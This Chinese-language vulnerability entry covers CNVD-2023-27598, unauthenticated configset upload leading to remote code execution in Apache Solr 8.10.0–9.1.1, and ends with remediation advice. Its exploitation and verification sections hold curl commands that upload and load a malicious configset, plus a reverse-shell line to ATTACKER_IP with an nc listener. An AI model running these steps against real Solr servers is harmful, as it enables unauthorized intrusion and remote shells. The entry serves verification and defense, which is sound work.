## 漏洞描述

Apache Solr 的 ConfigSets API 允许通过 `action=UPLOAD` 上传 configset 压缩包。在缺少认证部署时，未经认证的攻击者可以上传一个 configset，并使其以 **trusted configset** 的身份被加载。trusted configset 才被允许启用 `lib` 指令加载外部 JAR、ScriptUpdateProcessor、XSLT 等危险能力，攻击者据此在 Collection 创建/提交阶段加载并执行任意 Java 代码，实现远程代码执行。

> 注意：本条早期版本曾把机制写成 `RunExecutableListener`。该类已在 **Solr 7.1（SOLR-11482）** 中彻底移除（此前默认禁用），在 8.10+ 上不存在，无法作为利用点。CNVD-2023-27598 对应的实际攻击面是 ConfigSets API 的未授权上传。

## 影响版本

- Apache Solr 8.10.0 - 9.1.1（9.2.0 修复）

## 前置条件

- 目标未启用 Solr 认证/授权（或认证未覆盖 ConfigSets API）
- 能够访问 Solr API（默认 8983 端口）
- 目标未显式关闭 configset 上传（`solr.configset.upload.enabled` 默认为 `true`）

## 利用步骤

1. 确认目标 Solr 版本与 ConfigSets API 可达
2. 上传恶意 configset（含 `lib` 指令指向外部 JAR，或 ScriptUpdateProcessor 等危险组件）
3. 使用该 configset 创建 Collection，触发 configset 加载
4. 在攻击者服务器上确认收到反弹 shell 或 HTTP 回调

## Payload

```bash
# 步骤1: 确认 ConfigSets API 可达，并列出已有 configset
curl -s "http://target:8983/solr/admin/configs?action=LIST&wt=json"
```

```bash
# 步骤2: 上传恶意 configset（本地打包为 zip，目录内含 solrconfig.xml 等）
# 通过 lib 指令 / ScriptUpdateProcessor 等 trusted configset 专属能力引入外部代码
curl -X POST "http://target:8983/solr/admin/configs?action=UPLOAD&name=evilconfig" \
  --data-binary @evilconfig.zip \
  -H "Content-Type: application/octet-stream"
```

```bash
# 步骤3: 用恶意 configset 创建 Collection，触发 configset 加载与代码执行
curl -s "http://target:8983/solr/admin/collections?action=CREATE&name=evil&numShards=1&replicationFactor=1&collection.configName=evilconfig"
```

## 验证方法

```bash
# 方法1: HTTP 回调验证（推荐）
# 攻击者机器启动: python3 -m http.server 8888
# 在恶意 configset 的组件中让目标请求 http://ATTACKER_IP:8888/callback
# 检查 HTTP 服务日志是否收到 /callback 请求

# 方法2: 反弹 shell 验证
# 攻击者机器启动监听: nc -lvp 4444
# 在恶意 configset 的组件中执行 bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
# 检查是否获得 shell

# 方法3: 确认上传的 configset 已落盘
curl -s "http://target:8983/solr/admin/configs?action=LIST&wt=json"
```

## 指纹确认

```bash
curl -s "http://target:8983/solr/" | grep -i "solr"
# 检查是否为 SolrCloud 模式
curl -s "http://target:8983/solr/admin/collections?action=LIST&wt=json"
# 确认 ConfigSets API 是否可达
curl -s "http://target:8983/solr/admin/configs?action=LIST&wt=json"
```

## 修复建议

1. 升级 Apache Solr 至 9.2.0 或更高版本（9.2.0 起未经认证上传的 configset 不再被当作 trusted configset）
2. 未使用 ConfigSets API 时禁用上传：启动参数加 `-Dsolr.configset.upload.enabled=false`
3. 启用认证/授权（BasicAuthPlugin / RuleBasedAuthorizationPlugin），并限制 ConfigSets / Collections API 仅可信管理员可访问
4. 通过 `solr.configset.forbidden.file.types`（默认 `jar,jnilib,dll,so,dylib,exe`）禁止在 configset 中夹带可执行文件
